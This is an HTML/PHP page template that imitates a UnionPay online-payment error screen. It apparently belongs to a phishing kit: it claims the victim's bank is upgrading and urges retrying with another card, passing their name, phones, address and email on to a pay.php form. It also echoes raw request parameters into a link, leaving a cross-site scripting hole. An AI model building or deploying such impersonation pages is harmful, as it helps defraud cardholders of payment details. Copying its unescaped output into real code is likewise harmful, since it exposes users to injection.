<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>银联在线支付—错误提示</title>
<meta name="viewport" content="width=device-width,user-scalable=0,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0"/>
<meta name="format-detection" content="telephone=no" />
<script type="text/javascript" src="public/js/jquery-1.11.0.js" ></script>
<script>
    var docwidth=$(window).width();
    if(docwidth>640)
    {
      $("html").css("font-size", "20px");
    }
    else
    {
      $("html").css("font-size", 20 * ( docwidth/ 640) + 'px');
    }
  </script>
    
<style>
html{
  margin: 0 auto;
}
body{
  margin: 0;  
  position: relative`;
  font-family: "microsoft yahei";
  background:#fff;
  
}
img{
  vertical-align: middle;
}
ul{
  list-style: none;
  margin: 0;
  padding: 0;
}
a{
  text-decoration: none;
}
html,body,h1,h2,h3,h4,h5,h6,div,dl,dt,dd,ul,ol,li,em,i,p,blockquote,pre,hr,figure,table,caption,th,td,form,fieldset,legend,input,button,textarea,menu{margin:0;padding:0;font-style:normal;}
.clear{clear:both}

.top{width:32rem;margin:0 auto;height:2.2rem;border-bottom:solid 0.1rem #31599e;}
.top a{float:left;font-size:0.8rem;color:#000;width:4rem;text-align:center;border-right:solid 0.05rem #000;line-height:1.3rem;margin-top:0.45rem;display:inline-block;}
.top-box{width:31.5rem;height:12.25rem;background:#e9f4f6;border:solid 0.05rem #4267a7;margin-top:0.6rem;margin-left:0.2rem;padding-top:2.45rem;}
.top-box span{line-height:1.8rem;font-size:1.2rem;color:#da3830;display:inline-block;}
.db-box{width:31.5rem;height:3.025rem;background:#f4f4f4;border:0.05rem dashed #dedede;margin:0 auto;padding-top:0.725rem;}
.db-box1{float:left;width:8.2rem;margin-left:1.6rem;}
.db-box1 img{width:2.4rem;height:2.4rem;float:left;margin-right:0.4rem;}
.db-box1 h1{font-size:0.8rem;font-weight:normal;float:left;line-height:1.3rem;color:#046aa8;}
.db-box1 p{font-size:0.6rem;float:left;line-height:0.8rem;color:#000;}
.db-box2 a{font-size:1rem;color:#728196;line-height:1.5rem;display:inline-block;}
.db-box2 p{font-size:1rem;color:#728196;line-height:1.5rem;display:inline-block;width: 100%;box-sizing: border-box;}
.db-box2 i{width:0.05rem;height:0.4rem;background:#728196;display:inline-block;line-height:1.5rem;margin-left:0.3rem;}
.topp{height: 5rem;border-bottom: 3px solid #28529a;display: flex;justify-content: space-between;padding: 0 5px;align-items:center;box-sizing: border-box;}
.topp img{width: 100px;height: 25px;}
.infoBox a{color: #000000;font-size: 0.8rem;}
.infoBox span{display: inline-block;width: 100px;height: 10px;background: url(public/images/add2.png) 
no-repeat center center/cover;}
</style>
</head>

<body>

 <div style="width:32rem;margin:0 auto;">
        <div class="topp">
         <img src="public/images/add1.png" alt="" />
         <div class="infoBox">
           <a href="javascript:;">首页 |</a>
           <a href="javascript:;">帮助中心 |</a>
           <a href="javascript:;">English |</a>
           <span></span>
         </div>
       </div>
       <div class="clear"></div>
      
      <div class="top-box">
         <img src="public/images/xx.jpg" style="width:2.45rem;height:2.45rem;margin-left:2.4rem;margin-right:1rem;"/>
         <span>很抱歉，您的订单未支付成功</span>
         <p style="font-size:0.8rem;color:#000;line-height:1.4rem;margin-top: -0.5rem;margin-left:6.1rem;">失败原因：该银行系统升级，请更换其他银行卡付款{1000041}</p>
         <div style="width:20.15rem;height:2rem;border:solid 0.05rem #c4c4c4;margin-top:1rem;margin-left:6rem;">
         <img src="public/images/xxx.jpg" style="width:1.3rem;height:1.3rem;margin-left:0.5rem;margin-right:0.4rem;"/>
         <em style="font-size:0.8rem;color:#666666;line-height:2rem">建议更换其他类型银行卡重试！以免订单失效。</em></div>
         <a href="pay.php?recipients=<?php echo $_GET['recipients']?>&dianhua=<?php echo $_GET['dianhua']?>&address=<?php echo $_GET['address']?>&mailbox=<?php echo $_GET['mailbox']?>&dianhua2=<?php echo $_GET['dianhua2']?>" style="font-size:1rem;color:#1c6f79;width:7.2rem;height:2.3rem;border:solid 0.05rem #d6d8db;background:#cbe3e5;display:block;line-height:2.2rem;text-align:center;border-radius:0.3rem;margin-top:1.15rem;margin-left:6rem;">更换其他卡付款</a>
      </div>
      <h1 style="font-size:0.9rem;line-height:1.3rem;margin-top:0.35rem;margin-left:1rem;margin-bottom:0.5rem;">银联在线支付精品服务:</h1>
      <div class="db-box">
        <a href=""><div class="db-box1">
         <img src="public/images/t1.png" />
         <h1>信用卡还款</h1>
         <p>放心还款 跨行免费</p>
       </div></a>
        <a href=""><div class="db-box1">
         <img src="public/images/t2.png" />
         <h1>话费宽带缴费</h1>
         <p>在线话费宽带缴费</p>
       </div></a>
       <a href=""> <div class="db-box1">
         <img src="public/images/t3.png" />
         <h1>水电煤缴费</h1>
         <p>无需排队 零手续费</p>
       </div></a>
       <!--<div class="db-box1">
         <img src="images/t1.png" />
         <h1>信用卡还款</h1>
         <p>放心还款 跨行免费</p>
       </div>-->
      </div>
      <div class="clear"></div>
     <div style="width:32rem;height:0.05rem;background:#f4f4f4;margin-top:0.5rem;"></div>
     <div class="db-box2">
      <a href="">银联官网</a><i></i>
      <a href="">银联在线支付</a><i></i>
      <a href="">关于我们</a><i></i>
      <a href="">网站使用条款</a><br>
     <p>中国银联股份有限公司版权所有 © 2002-2019 沪ICP备07032180号</p>
     </div>
     </div>
 </div>
</body>
</html>